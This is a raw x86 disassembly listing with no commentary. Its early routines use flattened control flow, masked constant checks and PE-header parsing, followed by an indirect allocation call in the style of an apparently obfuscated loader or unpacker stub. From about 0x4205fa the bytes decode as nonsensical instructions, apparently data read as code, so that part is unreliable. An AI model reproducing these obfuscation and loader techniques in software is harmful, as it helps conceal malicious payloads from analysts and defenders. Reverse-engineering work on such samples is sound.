  4200f9:	mov    DWORD PTR [ebp-0x10],ecx
  4200fc:	lea    ecx,[ebp-0x34]
  4200ff:	mov    DWORD PTR [ebp+0xc],ecx
  420102:	lea    ecx,[ebp-0x38]
  420105:	mov    DWORD PTR [ebp-0x14],ecx
  420108:	mov    ecx,DWORD PTR [ebp+0x8]
  42010b:	xor    ecx,edi
  42010d:	add    ecx,ebx
  42010f:	mov    DWORD PTR [ebp-0x18],ecx
  420112:	jmp    0x42030e
  420117:	cmp    eax,0xf89c85bb
  42011c:	je     0x420320
  420122:	mov    ecx,DWORD PTR [ebp-0x8]
  420125:	xor    ecx,edi
  420127:	mov    esi,eax
  420129:	add    ecx,ebx
  42012b:	mov    DWORD PTR [ebp+0x18],ecx
  42012e:	mov    eax,DWORD PTR [ebp-0x18]
  420131:	xor    esi,edi
  420133:	lea    eax,[eax+esi*1+0x3272e2]
  42013a:	mov    DWORD PTR [ebp-0x18],eax
  42013d:	mov    eax,DWORD PTR [ebp-0x8]
  420140:	mov    ecx,DWORD PTR [ebp-0x18]
  420143:	xor    eax,edi
  420145:	add    eax,ebx
  420147:	cmp    ecx,eax
  420149:	jne    0x42015e
  42014b:	mov    eax,DWORD PTR [ebp+0x8]
  42014e:	xor    eax,edi
  420150:	add    eax,ebx
  420152:	push   eax
  420153:	push   0xc
  420155:	lea    eax,[ebp-0x4c]
  420158:	push   eax
  420159:	call   0x41fb60
  42015e:	mov    eax,DWORD PTR [ebp-0xc]
  420161:	mov    eax,DWORD PTR [eax]
  420163:	xor    eax,edi
  420165:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42016c:	mov    ecx,DWORD PTR [ebp+0x8]
  42016f:	xor    ecx,edi
  420171:	movzx  eax,al
  420174:	add    ecx,ebx
  420176:	cmp    eax,ecx
  420178:	je     0x4202f6
  42017e:	mov    eax,DWORD PTR [ebp-0x10]
  420181:	mov    eax,DWORD PTR [eax]
  420183:	xor    eax,edi
  420185:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42018c:	mov    ecx,DWORD PTR [ebp+0x8]
  42018f:	xor    ecx,edi
  420191:	movzx  eax,al
  420194:	add    ecx,ebx
  420196:	cmp    eax,ecx
  420198:	je     0x4202f6
  42019e:	mov    eax,DWORD PTR [ebp+0xc]
  4201a1:	mov    eax,DWORD PTR [eax]
  4201a3:	xor    eax,edi
  4201a5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4201af:	xor    ecx,edi
  4201b1:	movzx  eax,al
  4201b4:	add    ecx,ebx
  4201b6:	cmp    eax,ecx
  4201b8:	je     0x4202f6
  4201be:	mov    eax,DWORD PTR [ebp-0x14]
  4201c1:	mov    eax,DWORD PTR [eax]
  4201c3:	xor    eax,edi
  4201c5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4201cf:	xor    ecx,edi
  4201d1:	movzx  eax,al
  4201d4:	add    ecx,ebx
  4201d6:	cmp    eax,ecx
  4201d8:	je     0x4202f6
  4201de:	mov    eax,DWORD PTR [ebp-0x10]
  4201e1:	mov    eax,DWORD PTR [eax]
  4201e3:	xor    eax,edi
  4201e5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4201ef:	mov    ecx,DWORD PTR [ecx]
  4201f1:	xor    ecx,edi
  4201f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4201fa:	xor    al,cl
  4201fc:	mov    ecx,DWORD PTR [ebp+0xc]
  4201ff:	mov    ecx,DWORD PTR [ecx]
  420201:	xor    ecx,edi
  420203:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42020a:	or     al,cl
  42020c:	mov    ecx,DWORD PTR [ebp-0xc]
  42020f:	mov    ecx,DWORD PTR [ecx]
  420211:	xor    ecx,edi
  420213:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42021a:	cmp    cl,al
  42021c:	jne    0x4202f6
  420222:	mov    eax,DWORD PTR [ebp+0xc]
  420225:	mov    eax,DWORD PTR [eax]
  420227:	xor    eax,edi
  420229:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420230:	mov    ecx,DWORD PTR [ebp-0x10]
  420233:	mov    ecx,DWORD PTR [ecx]
  420235:	xor    ecx,edi
  420237:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42023e:	xor    al,cl
  420240:	mov    ecx,DWORD PTR [ebp-0x14]
  420243:	mov    ecx,DWORD PTR [ecx]
  420245:	xor    ecx,edi
  420247:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42024e:	or     al,cl
  420250:	mov    ecx,DWORD PTR [ebp-0x10]
  420253:	mov    ecx,DWORD PTR [ecx]
  420255:	xor    ecx,edi
  420257:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42025e:	cmp    cl,al
  420260:	jne    0x4202f6
  420266:	mov    eax,DWORD PTR [ebp-0x14]
  420269:	mov    eax,DWORD PTR [eax]
  42026b:	xor    eax,edi
  42026d:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420274:	mov    ecx,DWORD PTR [ebp+0xc]
  420277:	mov    ecx,DWORD PTR [ecx]
  420279:	xor    ecx,edi
  42027b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420282:	xor    al,cl
  420284:	mov    ecx,DWORD PTR [ebp-0xc]
  420287:	mov    ecx,DWORD PTR [ecx]
  420289:	xor    ecx,edi
  42028b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420292:	or     al,cl
  420294:	mov    ecx,DWORD PTR [ebp+0xc]
  420297:	mov    ecx,DWORD PTR [ecx]
  420299:	xor    ecx,edi
  42029b:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202a2:	cmp    cl,al
  4202a4:	jne    0x4202f6
  4202a6:	mov    eax,DWORD PTR [ebp-0x14]
  4202a9:	mov    eax,DWORD PTR [eax]
  4202ab:	xor    eax,edi
  4202ad:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4202b4:	mov    ecx,DWORD PTR [ebp-0xc]
  4202b7:	mov    ecx,DWORD PTR [ecx]
  4202b9:	xor    ecx,edi
  4202bb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202c2:	xor    al,cl
  4202c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4202c7:	mov    ecx,DWORD PTR [ecx]
  4202c9:	xor    ecx,edi
  4202cb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202d2:	or     al,cl
  4202d4:	mov    ecx,DWORD PTR [ebp-0x14]
  4202d7:	mov    ecx,DWORD PTR [ecx]
  4202d9:	xor    ecx,edi
  4202db:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202e2:	cmp    cl,al
  4202e4:	jne    0x4202f6
  4202e6:	lea    eax,[ebp-0x4c]
  4202e9:	push   eax
  4202ea:	call   0x41fdb1
  4202ef:	mov    ecx,DWORD PTR [ebp-0x44]
  4202f2:	cmp    eax,ecx
  4202f4:	je     0x420300
  4202f6:	mov    eax,DWORD PTR [ebp+0x8]
  4202f9:	xor    eax,edi
  4202fb:	add    eax,ebx
  4202fd:	mov    DWORD PTR [ebp+0x18],eax
  420300:	mov    eax,DWORD PTR [ebp-0x8]
  420303:	xor    eax,edi
  420305:	lea    eax,[eax+esi*1+0x3272e2]
  42030c:	xor    eax,edi
  42030e:	mov    ecx,DWORD PTR [ebp+0x8]
  420311:	mov    edx,DWORD PTR [ebp+0x18]
  420314:	xor    ecx,edi
  420316:	add    ecx,ebx
  420318:	cmp    edx,ecx
  42031a:	je     0x420117
  420320:	mov    eax,DWORD PTR [ebp+0x8]
  420323:	mov    ecx,DWORD PTR [ebp+0x18]
  420326:	xor    eax,edi
  420328:	add    eax,ebx
  42032a:	cmp    ecx,eax
  42032c:	jne    0x42033f
  42032e:	mov    eax,DWORD PTR [ebp-0x8]
  420331:	mov    ecx,DWORD PTR [ebp+0x1c]
  420334:	xor    eax,edi
  420336:	lea    eax,[eax+ecx*1+0x3272e2]
  42033d:	jmp    0x4203b6
  42033f:	push   0x18
  420341:	push   DWORD PTR [ebp-0x4]
  420344:	lea    eax,[ebp-0x64]
  420347:	push   eax
  420348:	call   0x41f5d3
  42034d:	mov    eax,DWORD PTR [ebp+0x8]
  420350:	mov    ecx,DWORD PTR [ebp-0x18]
  420353:	xor    eax,edi
  420355:	add    eax,ebx
  420357:	cmp    eax,ecx
  420359:	je     0x42036e
  42035b:	mov    eax,DWORD PTR [ebp+0x8]
  42035e:	xor    eax,edi
  420360:	add    eax,ebx
  420362:	push   eax
  420363:	push   0x18
  420365:	lea    eax,[ebp-0x64]
  420368:	push   eax
  420369:	call   0x41fb60
  42036e:	mov    eax,DWORD PTR [ebp-0x4]
  420371:	add    eax,0x18
  420374:	mov    DWORD PTR [ebp+0x18],eax
  420377:	push   DWORD PTR [ebp-0x50]
  42037a:	push   DWORD PTR [ebp+0x18]
  42037d:	mov    eax,DWORD PTR [ebp-0x54]
  420380:	add    eax,DWORD PTR [ebp-0x20]
  420383:	push   eax
  420384:	call   0x41f5d3
  420389:	mov    eax,DWORD PTR [ebp+0x8]
  42038c:	mov    ecx,DWORD PTR [ebp-0x18]
  42038f:	xor    eax,edi
  420391:	add    eax,ebx
  420393:	cmp    eax,ecx
  420395:	je     0x4203a8
  420397:	push   0x0
  420399:	push   DWORD PTR [ebp-0x50]
  42039c:	mov    eax,DWORD PTR [ebp-0x54]
  42039f:	add    eax,DWORD PTR [ebp-0x20]
  4203a2:	push   eax
  4203a3:	call   0x41fb60
  4203a8:	mov    eax,DWORD PTR [ebp-0x24]
  4203ab:	mov    ecx,DWORD PTR [ebp-0x50]
  4203ae:	add    DWORD PTR [eax],ecx
  4203b0:	mov    eax,DWORD PTR [ebp-0x50]
  4203b3:	add    eax,DWORD PTR [ebp+0x1c]
  4203b6:	mov    DWORD PTR [ebp+0x1c],eax
  4203b9:	mov    eax,DWORD PTR [ebp-0x8]
  4203bc:	mov    ecx,DWORD PTR [ebp+0x1c]
  4203bf:	xor    eax,edi
  4203c1:	add    eax,ebx
  4203c3:	imul   eax,ecx
  4203c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4203c9:	mov    edx,DWORD PTR [ebp-0x28]
  4203cc:	xor    ecx,edi
  4203ce:	lea    ecx,[ecx+edx*1+0x3272e2]
  4203d5:	cmp    eax,ecx
  4203d7:	jb     0x420035
  4203dd:	mov    esi,DWORD PTR [ebp+0x14]
  4203e0:	mov    eax,DWORD PTR [ebp-0x20]
  4203e3:	mov    DWORD PTR [esi],eax
  4203e5:	jmp    0x42042c
  4203e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4203ea:	mov    edx,DWORD PTR [ebp+0xc]
  4203ed:	xor    ecx,edi
  4203ef:	xor    edx,edi
  4203f1:	add    ecx,ebx
  4203f3:	add    edx,ebx
  4203f5:	cmp    ecx,edx
  4203f7:	jne    0x42040b
  4203f9:	mov    eax,ds:0x7f642d1e
  4203fe:	imul   eax,eax,0x9f15fcef
  420404:	mov    ds:0x7f642d1e,eax
  420409:	jmp    0x42042c
  42040b:	mov    ecx,DWORD PTR [ebp+0x8]
  42040e:	xor    ecx,edi
  420410:	add    ecx,ebx
  420412:	cmp    eax,ecx
  420414:	je     0x420422
  420416:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  420420:	jmp    0x42042c
  420422:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  42042c:	pop    edi
  42042d:	pop    esi
  42042e:	pop    ebx
  42042f:	leave  
  420430:	ret    0x18
  420433:	push   ebp
  420434:	mov    ebp,esp
  420436:	and    esp,0xfffffff8
  420439:	mov    eax,DWORD PTR [ebp+0x20]
  42043c:	sub    esp,0x14
  42043f:	push   ebx
  420440:	mov    ebx,DWORD PTR [ebp+0x14]
  420443:	push   esi
  420444:	push   edi
  420445:	cmp    eax,0xf89c8585
  42044a:	jne    0x420456
  42044c:	push   0xf89c8584
  420451:	jmp    0x420588
  420456:	mov    eax,DWORD PTR [ebp+0x20]
  420459:	cmp    eax,0xf89c8584
  42045e:	jne    0x42046a
  420460:	push   0xf89c85bb
  420465:	jmp    0x420588
  42046a:	mov    eax,DWORD PTR [ebp+0x20]
  42046d:	cmp    eax,0xf89c85bb
  420472:	jne    0x42047e
  420474:	push   0xf89c85ba
  420479:	jmp    0x420588
  42047e:	mov    eax,DWORD PTR [ebp+0x20]
  420481:	cmp    eax,0xf89c85ba
  420486:	jne    0x420492
  420488:	push   0xf89c85b9
  42048d:	jmp    0x420588
  420492:	mov    ecx,DWORD PTR [ebp+0x20]
  420495:	mov    eax,0xf89c85be
  42049a:	cmp    ecx,eax
  42049c:	jne    0x420558
  4204a2:	mov    eax,DWORD PTR [ebp+0x10]
  4204a5:	mov    DWORD PTR [esp+0xc],eax
  4204a9:	mov    eax,DWORD PTR [ebp+0x18]
  4204ac:	mov    DWORD PTR [esp+0x14],eax
  4204b0:	mov    eax,DWORD PTR [ebp+0xc]
  4204b3:	mov    DWORD PTR [esp+0x18],eax
  4204b7:	mov    eax,DWORD PTR [ebp+0x8]
  4204ba:	mov    DWORD PTR [esp+0x10],eax
  4204be:	mov    eax,DWORD PTR [esp+0x10]
  4204c2:	mov    ecx,DWORD PTR [esp+0x14]
  4204c6:	mov    edi,0x751089b
  4204cb:	xor    eax,edi
  4204cd:	mov    esi,0x3272e2
  4204d2:	add    eax,esi
  4204d4:	mov    DWORD PTR [ecx],eax
  4204d6:	mov    eax,DWORD PTR [esp+0xc]
  4204da:	mov    eax,DWORD PTR [eax+0x194]
  4204e0:	mov    ecx,DWORD PTR [eax]
  4204e2:	mov    eax,DWORD PTR [esp+0xc]
  4204e6:	mov    eax,DWORD PTR [eax+0x194]
  4204ec:	mov    eax,DWORD PTR [eax]
  4204ee:	add    eax,DWORD PTR [ecx+0x3c]
  4204f1:	mov    ecx,DWORD PTR [esp+0xc]
  4204f5:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4204fb:	mov    ecx,DWORD PTR [ecx+0x14]
  4204fe:	push   0x4
  420500:	push   0x3000
  420505:	push   DWORD PTR [eax+0x50]
  420508:	push   0x0
  42050a:	call   ecx
  42050c:	mov    DWORD PTR [ebx],eax
  42050e:	mov    eax,DWORD PTR [esp+0x10]
  420512:	push   DWORD PTR [esp+0xc]
  420516:	xor    eax,edi
  420518:	add    eax,esi
  42051a:	mov    DWORD PTR [esp+0x20],eax
  42051e:	lea    eax,[esp+0x20]
  420522:	push   eax
  420523:	push   ebx
  420524:	push   DWORD PTR [esp+0x20]
  420528:	push   DWORD PTR [esp+0x28]
  42052c:	push   DWORD PTR [esp+0x24]
  420530:	call   0x41fef5
  420535:	mov    eax,DWORD PTR [esp+0x10]
  420539:	mov    ecx,DWORD PTR [ebx]
  42053b:	xor    eax,edi
  42053d:	add    eax,esi
  42053f:	cmp    ecx,eax
  420541:	je     0x42059f
  420543:	mov    eax,DWORD PTR [esp+0x18]
  420547:	mov    ecx,DWORD PTR [esp+0x14]
  42054b:	xor    eax,edi
  42054d:	add    eax,esi
  42054f:	imul   eax,DWORD PTR [esp+0x1c]
  420554:	mov    DWORD PTR [ecx],eax
  420556:	jmp    0x42059f
  420558:	mov    ecx,DWORD PTR [ebp+0x20]
  42055b:	cmp    ecx,0xf89c85b9
  420561:	jne    0x42056a
  420563:	push   0xf89c85b8
  420568:	jmp    0x420588
  42056a:	mov    ecx,DWORD PTR [ebp+0x20]
  42056d:	cmp    ecx,0xf89c85b8
  420573:	jne    0x42057c
  420575:	push   0xf89c85bf
  42057a:	jmp    0x420588
  42057c:	mov    ecx,DWORD PTR [ebp+0x20]
  42057f:	cmp    ecx,0xf89c85bf
  420585:	jne    0x42059f
  420587:	push   eax
  420588:	push   DWORD PTR [ebp+0x1c]
  42058b:	push   DWORD PTR [ebp+0x18]
  42058e:	push   ebx
  42058f:	push   DWORD PTR [ebp+0x10]
  420592:	push   DWORD PTR [ebp+0xc]
  420595:	push   DWORD PTR [ebp+0x8]
  420598:	call   0x420433
  42059d:	mov    DWORD PTR [ebx],eax
  42059f:	mov    eax,DWORD PTR [ebx]
  4205a1:	pop    edi
  4205a2:	pop    esi
  4205a3:	pop    ebx
  4205a4:	mov    esp,ebp
  4205a6:	pop    ebp
  4205a7:	ret    0x1c
  4205aa:	push   ebp
  4205ab:	mov    ebp,esp
  4205ad:	sub    esp,0xc
  4205b0:	mov    eax,0xf89c8585
  4205b5:	mov    DWORD PTR [ebp-0x8],eax
  4205b8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4205bf:	mov    ecx,DWORD PTR [ebp-0x8]
  4205c2:	xor    ecx,0x751089b
  4205c8:	add    ecx,0x3272e2
  4205ce:	mov    DWORD PTR [ebp-0x4],ecx
  4205d1:	mov    ecx,DWORD PTR [ebp+0xc]
  4205d4:	push   eax
  4205d5:	mov    DWORD PTR [ebp+0xc],ecx
  4205d8:	push   DWORD PTR [ebp+0xc]
  4205db:	lea    eax,[ebp-0x4]
  4205de:	push   DWORD PTR [ebp+0x8]
  4205e1:	push   eax
  4205e2:	push   DWORD PTR [ebp+0xc]
  4205e5:	push   DWORD PTR [ebp-0xc]
  4205e8:	push   DWORD PTR [ebp-0x8]
  4205eb:	call   0x420433
  4205f0:	mov    DWORD PTR [ebp-0x4],eax
  4205f3:	mov    eax,DWORD PTR [ebp-0x4]
  4205f6:	leave  
  4205f7:	ret    0x8
  4205fa:	jg     0x4205b0
  4205fc:	jge    0xf741c5d1
  420602:	add    ebp,DWORD PTR [eax-0xa]
  420605:	mov    bx,0xe0bb
  420609:	test   eax,0x18308
  42060e:	cld    
  42060f:	add    DWORD PTR [eax],eax
  420611:	add    dh,dh
  420613:	clc    
  420614:	stos   DWORD PTR es:[edi],eax
  420615:	dec    esp
  420616:	int3   
  420617:	mov    ds:0x1b929547,al
  42061c:	(bad)  
  42061d:	sahf   
  42061e:	jge    0x4205c3
  420620:	dec    ebx
  420621:	int3   
  420622:	xchg   ecx,eax
  420623:	pop    esp
  420624:	mov    al,ds:0x84c957bc
  420629:	scas   al,BYTE PTR es:[edi]
  42062a:	push   0xd0b9dba6
  42062f:	mov    eax,ds:0x6b76b12e
  420634:	(bad)  
  420635:	imul   ebp,DWORD PTR [ecx-0x1],0x54
  420639:	jp     0x4205ec
  42063b:	ss out dx,al
  42063d:	aad    0x31
  42063f:	add    eax,0xeabca215
  420644:	cli    
  420645:	mov    BYTE PTR [ebx+0xff23e7f],bl
  42064b:	scas   eax,DWORD PTR es:[edi]
  42064c:	cmp    eax,0x8eb9d5b7
  420651:	inc    esi
  420652:	dec    eax
  420653:	mov    ecx,0x94d66ea
  420658:	sbb    DWORD PTR [esp+edi*4+0x66],ebx
  42065c:	adc    bh,ch
  42065e:	pop    ds
  42065f:	and    dh,BYTE PTR [ebp-0x2cb9ab5c]
  420665:	sub    al,0x8c
  420667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420668:	rol    DWORD PTR [ecx],0x24
  42066b:	xchg   edx,eax
  42066c:	mov    cl,0x5
  42066e:	(bad)  
  42066f:	out    0x2b,eax
  420671:	push   es
  420672:	fwait
  420673:	in     eax,dx
  420674:	shl    esi,0xa7
  420677:	push   esi
  420678:	std    
  420679:	(bad)  
  42067a:	and    DWORD PTR [ebx+edi*4],edi
  42067d:	clc    
  42067e:	inc    eax
  420680:	imul   eax,DWORD PTR [ecx+edi*1+0x65],0x87203deb
  420688:	out    dx,eax
  420689:	ja     0x42069b
  42068b:	les    ecx,FWORD PTR ds:0xe3956713
  420691:	test   al,0xa5
  420693:	fdiv   QWORD PTR [ebp-0x4cadc7c6]
  420699:	outs   dx,DWORD PTR ds:[esi]
  42069a:	test   al,0xac
  42069c:	jge    0x4206cb
  42069e:	arpl   WORD PTR [esi+eax*8-0x2],si
  4206a2:	jmp    0x420697
  4206a4:	jmp    0x39eb:0x3cfa1457
  4206ab:	gs pop ss
  4206ad:	add    bl,BYTE PTR [ebx+0x1]
  4206b0:	bound  edx,QWORD PTR [esi+ecx*2-0x1b]
  4206b4:	cmc    
  4206b5:	in     eax,dx
  4206b6:	(bad)  
  4206b8:	or     al,BYTE PTR [edx-0x193c6a9]
  4206be:	jne    0x420683
  4206c0:	gs loopne 0x4206d0
  4206c3:	out    0x2c,al
  4206c5:	push   esp
  4206c6:	das    
  4206c7:	mov    cl,0x38
  4206c9:	in     al,dx
  4206ca:	mov    bl,0x88
  4206cc:	push   ds
  4206cd:	test   DWORD PTR [eax-0x54],ebx
  4206d0:	fdiv   st,st(0)
  4206d2:	mov    dh,0xa
  4206d4:	jo     0x42069e
  4206d6:	mov    ch,0x1c
  4206d8:	xchg   edi,eax
  4206d9:	aad    0x14
  4206db:	mov    dl,BYTE PTR ds:0xee053b2c
  4206e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206e2:	jge    0x42073d
  4206e4:	or     al,0x41
  4206e6:	lods   al,BYTE PTR ds:[esi]
  4206e7:	mov    ds:0x300a31ca,al
  4206ec:	xor    DWORD PTR es:[edi],0x3020a735
  4206f3:	(bad)  
  4206f4:	pop    edx
  4206f5:	int3   
  4206f6:	fsub   DWORD PTR [esi]
  4206f8:	call   0x8541:0xf5b46ed8
  4206ff:	push   ss
  420700:	das    
  420701:	test   al,0x1e
  420704:	rcl    DWORD PTR [ebx],1
  420706:	rcl    BYTE PTR [esi-0x483f68e2],1
  42070c:	jmp    DWORD PTR [edi+0x19f8f7d3]
  420712:	dec    ebx
  420713:	dec    edx
  420714:	lahf   
  420715:	fisub  DWORD PTR [ecx+0x4ab13d1]
  42071b:	push   ecx
  42071c:	addr16 mov eax,ss
  42071f:	aam    0x9d
  420721:	inc    ebx
  420722:	daa    
  420723:	and    al,0x39
  420725:	jecxz  0x420715
  420727:	mov    edx,eax
  420729:	dec    eax
  42072a:	push   es
  42072b:	das    
  42072c:	or     dl,al
  42072e:	sub    cl,ch
  420730:	fisttp QWORD PTR gs:[ebx+0x15]
  420734:	jo     0x420701
  420736:	imul   ebp,ecx,0xffffffb8
  420739:	sub    bl,BYTE PTR [edi-0x35]
  42073c:	push   edx
  42073d:	mov    esp,0x8ad0d2bb
  420742:	or     al,0x9d
  420744:	adc    BYTE PTR [ebx-0x79492184],bh
  42074a:	out    0x24,eax
  42074c:	and    ebp,ebp
  42074e:	jnp    0x4207ac
  420750:	and    BYTE PTR [edx],dh
  420752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420754:	gs sbb cl,ah
  420757:	cwde   
  420758:	cwde   
  420759:	out    dx,al
  42075a:	add    al,0xeb
  42075c:	push   0x21
  42075e:	sbb    ecx,eax
  420760:	loop   0x420740
  420762:	sub    ebx,DWORD PTR [edi]
  420764:	imul   esp,DWORD PTR [ebx-0x16],0x27
  420768:	sbb    WORD PTR [eax-0x14],ax
  42076c:	aaa    
  42076d:	mov    fs,WORD PTR ds:0x23e38153
  420773:	cli    
  420774:	js     0x4207af
  420776:	cmp    al,0x70
  420778:	clc    
  420779:	out    0x9c,al
  42077b:	mov    al,0x2d
  42077d:	sub    dl,dl
  42077f:	dec    esp
  420780:	mov    cl,0xa1
  420782:	ja     0x420800
  420784:	or     eax,0x295c5392
  420789:	(bad)  
  42078b:	cmp    DWORD PTR [edx],eax
  42078d:	sbb    ebp,DWORD PTR [edi+0x57]
  420790:	cdq    
  420791:	mov    dl,0x48
  420793:	sahf   
  420794:	add    ebx,DWORD PTR [ebx+0x4]
  420797:	pop    esp
  420798:	invd   
  42079a:	xor    BYTE PTR [edi-0x6b],bh
  42079d:	push   0x2e
  42079f:	pop    ecx
  4207a0:	mov    ch,0xbd
  4207a2:	or     BYTE PTR [edx+esi*1-0x1326a26e],bl
  4207a9:	mov    edx,0xb34439d1
  4207ae:	pop    edx
  4207af:	pop    ebp
  4207b0:	fiadd  WORD PTR [edi]
  4207b2:	test   ebx,0xbcf8e0de
  4207b8:	daa    
  4207b9:	jb     0x4207c9
  4207bb:	mov    bl,0x95
  4207bd:	push   es
  4207be:	push   ss
  4207bf:	mov    ecx,0xe406b3ef
  4207c4:	inc    esp
  4207c5:	clc    
  4207c6:	sbb    BYTE PTR [eax],bl
  4207c8:	outs   dx,BYTE PTR ds:[esi]
  4207c9:	inc    ebp
  4207ca:	imul   ecx,DWORD PTR [ebp-0x58],0xce09a8b7
  4207d1:	in     eax,dx
  4207d2:	jns    0x420806
  4207d4:	xlat   BYTE PTR ds:[ebx]
  4207d5:	outs   dx,BYTE PTR ds:[esi]
  4207d6:	cli    
  4207d7:	scas   al,BYTE PTR es:[edi]
  4207d8:	sbb    al,0x1a
  4207da:	adc    edx,esp
  4207dc:	jno    0x42079a
  4207de:	inc    ebx
  4207df:	mov    edi,0x682fc7bc
  4207e4:	push   0x1a765ed
  4207e9:	pop    esp
  4207ea:	(bad)  [ecx+0x33]
  4207ed:	cmp    al,0x88
  4207ef:	cld    
  4207f0:	lods   al,BYTE PTR ds:[esi]
  4207f1:	fwait
  4207f2:	lock push ecx
  4207f4:	lock ds rcr esi,0x26
  4207f9:	push   ds
  4207fa:	pop    ebp
  4207fb:	mov    dh,0xe8
  4207fd:	jo     0x4207ed
  4207ff:	sub    eax,0xa1222836
  420804:	jne    0x4207fe
  420806:	(bad)  
  420807:	dec    edi
  420808:	mov    edi,0xa32d80e6
  42080d:	xchg   edx,eax
	...
  42081a:	ja     0x420868
  42081c:	idiv   dh
  42081e:	(bad)  
  42081f:	(bad)  
  420820:	jg     0x4207ef
  420822:	mul    BYTE PTR [ebx+0xfb02ffd]
  420828:	sbb    al,0x2b
  42082a:	add    al,0x85
  42082c:	add    DWORD PTR [eax],eax
  42082e:	cld    
  42082f:	add    DWORD PTR [eax],eax
  420831:	add    BYTE PTR [ebx+0x5],bh
  420834:	les    edi,FWORD PTR [edx-0x146a7565]
  42083a:	cld    
  42083b:	mov    ebx,0x415d9c2d
  420840:	rol    cl,0x72
  420843:	or     al,0x75
  420845:	and    ch,BYTE PTR [esp+ecx*8+0x60]
  420849:	(bad)  
  42084a:	adc    ch,BYTE PTR [ebp+eax*4-0x750f710a]
  420851:	out    dx,al
  420852:	stc    
  420853:	push   esp
  420854:	push   0xca0a47d5
  420859:	mov    edi,DWORD PTR [edx+0x5081c5c2]
  42085f:	xor    ebp,ebp
  420861:	mov    DWORD PTR ds:0x434ce066,esi
  420867:	sub    al,0x79
  420869:	cmp    DWORD PTR ds:0xe8d42613,ebx
  42086f:	call   0x323:0xc8484ffd
  420876:	sbb    BYTE PTR [ebx+0x77],bh
  420879:	or     DWORD PTR [esi],0xffffffea
  42087c:	xor    DWORD PTR [ecx],edi
  42087e:	adc    DWORD PTR [ecx+0x60],ebp
  420881:	xchg   esi,eax
  420882:	xchg   edi,eax
  420883:	sahf   
  420884:	jmp    0x4208df
  420886:	jns    0x420846
  420888:	ret    
  420889:	sbb    eax,0x2bb0ed17
  42088e:	cli    
  42088f:	add    al,0x89
  420891:	pusha  
  420892:	add    BYTE PTR [ecx-0x4c],bl
  420895:	icebp  
  420896:	inc    esi
  420897:	push   0x47463b8
  42089c:	xor    esi,DWORD PTR [esi-0xf]
  42089f:	stos   BYTE PTR es:[edi],al
  4208a0:	pop    edi
  4208a1:	mov    edx,ebx
  4208a3:	repnz mov WORD PTR [edi-0x6d],fs
  4208a7:	jle    0x4208d1
  4208a9:	cli    
  4208aa:	adc    eax,eax
  4208ac:	ret    
  4208ad:	push   ebx
  4208ae:	push   cs
  4208af:	ror    BYTE PTR [edx+0x5a],cl
  4208b2:	adc    ah,bh
  4208b4:	nop
  4208b5:	loop   0x420900
  4208b7:	loopne 0x4208a8
  4208b9:	cmc    
  4208ba:	lock loope 0x4208ef
  4208bd:	cmc    
  4208be:	and    ah,BYTE PTR [ebp-0x7c]
  4208c1:	push   esp
  4208c2:	fdivp  st(2),st
  4208c4:	sar    DWORD PTR [eax],0xb4
  4208c7:	xor    ebp,DWORD PTR [ebp+0x33a11029]
  4208cd:	arpl   WORD PTR [ebx-0x124035e],sp
  4208d3:	outs   dx,BYTE PTR ds:[esi]
  4208d4:	mov    eax,DWORD PTR [eax]
  4208d6:	out    0x4c,eax
  4208d8:	add    ebp,eax
  4208da:	sbb    al,0x98
  4208dc:	inc    eax
  4208dd:	pop    ebp
  4208de:	and    al,BYTE PTR [ebx+0x7e0fc22e]
  4208e4:	xor    al,0x4e
  4208e6:	test   eax,0x66208a83
  4208eb:	jecxz  0x420940
  4208ed:	inc    esp
  4208ee:	repz iret 
  4208f0:	mov    dl,0xb7
  4208f2:	or     al,0xeb
  4208f4:	adc    al,0xdb
  4208f6:	icebp  
  4208f7:	or     eax,DWORD PTR [esi-0x4173c430]
  4208fd:	dec    edx
  4208fe:	aaa    
  4208ff:	add    al,0xbf
  420901:	call   0x713f:0xb6f53131
  420908:	push   esi
  420909:	cli    
  42090a:	aaa    
  42090b:	imul   edx,DWORD PTR [ecx],0x4f
  42090e:	pop    es
  42090f:	push   edi
  420910:	xor    BYTE PTR [ecx+edx*1],0x85
  420914:	xor    eax,0x86e47dff
  420919:	mov    ecx,0x9de2f5ff
  42091e:	mov    al,ds:0x450d676f
  420923:	(bad)  
  420925:	mov    ah,0x4a
  420927:	sbb    eax,0x75687f8f
  42092c:	in     eax,0x7b
  42092e:	xchg   edi,eax
  42092f:	ins    DWORD PTR es:[edi],dx
  420930:	and    al,0xaa
  420932:	xor    esi,DWORD PTR [ecx-0x6b]
  420935:	scas   eax,DWORD PTR es:[edi]
  420936:	retf   
  420937:	push   ss
  420938:	das    
  420939:	in     al,0x69
